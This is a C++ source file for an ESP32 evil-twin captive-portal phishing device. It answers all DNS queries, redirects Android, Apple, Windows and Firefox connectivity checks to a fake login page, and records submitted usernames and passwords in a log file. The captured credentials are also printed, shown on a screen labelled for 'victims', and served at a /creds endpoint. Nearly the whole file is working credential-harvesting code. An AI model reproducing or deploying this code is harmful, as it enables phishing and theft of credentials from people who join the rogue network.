#include "web_server.h"
#include "NeoPixel.h"

void logLoginAttempt(String username, String password);

WebServer::WebServer() {
}

const String localIPURL = "http://4.3.2.1";

void WebServer::setUpDNSServer(DNSServer &dnsServer, IPAddress ip) {
  dnsServer.setTTL(3600);
  dnsServer.start(53, "*", ip);
}


void handleCredsRequest(AsyncWebServerRequest *request) {
  File logFile = LittleFS.open("/login.log", "r");
  if (!logFile) {
    request->send(404, "text/plain", "Log file not found");
    return;
  }

  String logContent = "";
  while (logFile.available()) {
    logContent += logFile.readStringUntil('\n');
    logContent += "\n";
  }
  logFile.close();

  request->send(200, "text/plain", logContent);
}

void logLoginAttempt(String username, String password) {
  // Open the log file in write mode and append if it exists, create it if not
  File logFile = LittleFS.open("/login.log", "a");

  if (!logFile) {
    Serial.println("Failed to open login.log file for writing");
    return;
  }

  String logEntry = username + " " + password;
  logFile.println(logEntry);
  logFile.close();
}

void WebServer::setUpWebserver(AsyncWebServer &server, IPAddress ip) {
  server.on("/connecttest.txt", [](AsyncWebServerRequest *request) {
    request->redirect("http://logout.net");
  });  // windows 11 captive portal workaround
  server.on("/wpad.dat", [](AsyncWebServerRequest *request) {
    request->send(404);
  });  // Honestly don't understand what this is but a 404 stops win 10 keep calling this repeatedly and panicking the esp32 :)

  // A Tier (commonly used by modern systems)
  server.on("/generate_204", [](AsyncWebServerRequest *request) {
    request->redirect(localIPURL);
  });  // android captive portal redirect
  server.on("/redirect", [](AsyncWebServerRequest *request) {
    request->redirect(localIPURL);
  });  // microsoft redirect
  server.on("/hotspot-detect.html", [](AsyncWebServerRequest *request) {
    request->redirect(localIPURL);
  });  // apple call home
  server.on("/canonical.html", [](AsyncWebServerRequest *request) {
    request->redirect(localIPURL);
  });  // firefox captive portal call home
  server.on("/success.txt", [](AsyncWebServerRequest *request) {
    request->send(200);
  });  // firefox captive portal call home
  server.on("/ncsi.txt", [](AsyncWebServerRequest *request) {
    request->redirect(localIPURL);
  });  // windows call home

  // return 404 to webpage icon
  server.on("/favicon.ico", [](AsyncWebServerRequest *request) {
    request->send(404);
  });  // webpage icon

  // Serve Basic HTML Page
  server.on("/", HTTP_ANY, [](AsyncWebServerRequest *request) {
    AsyncWebServerResponse *response = request->beginResponse(200, "text/html", index_html);
    response->addHeader("Cache-Control", "public,max-age=31536000");  // save this file to cache for 1 year (unless you refresh)
    request->send(response);
    Serial.println("Captive Portal Open");
    Screen::displayVictimConnected();
      NeoPixel::setNeoPixelColour("cyan");
  });

  server.on("/login", HTTP_POST, [&server](AsyncWebServerRequest *request) {
    String username = request->arg("username");
    String password = request->arg("password");

    logLoginAttempt(username, password);

    Serial.println("captured details " + username + " " + password);

    Screen::displayCredsFound(username, password);
    std::vector<String> colors = { "red", "yellow", "off" };
    NeoPixel::flash(3, colors, "red");
  });

  server.on("/creds", HTTP_GET, handleCredsRequest);

  // the catch all
  server.onNotFound([](AsyncWebServerRequest *request) {
    request->redirect(localIPURL);
    Serial.print("onnotfound ");
    Serial.print(request->host());  // This gives some insight into whatever was being requested on the serial monitor
    Serial.print(" ");
    Serial.print(request->url());
    Serial.print(" sent redirect to " + localIPURL + "\n");
  });
}
